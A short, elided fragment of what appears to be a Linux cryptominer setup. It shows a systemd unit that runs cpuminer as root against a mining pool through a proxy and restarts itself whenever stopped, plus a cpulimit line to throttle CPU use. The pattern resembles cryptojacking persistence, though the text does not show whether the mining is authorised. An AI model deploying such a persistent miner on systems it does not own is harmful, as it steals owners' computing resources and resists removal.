...
[Service]
ExecStart= /usr/local/src/cpuminer-opt-3.8.3.1/cpuminer -a lyra2z330 -o stratum+tcp://hxx-pool2.chainsilo.com:3032 -u manlytq.amz -p x -x 45.63.57.158:1102
WatchdogSec=352
Restart=always
RestartSec=60
User=root
...
cpulimit --exe cpuminer --limit 2881 -b &&
#!/bin/bash
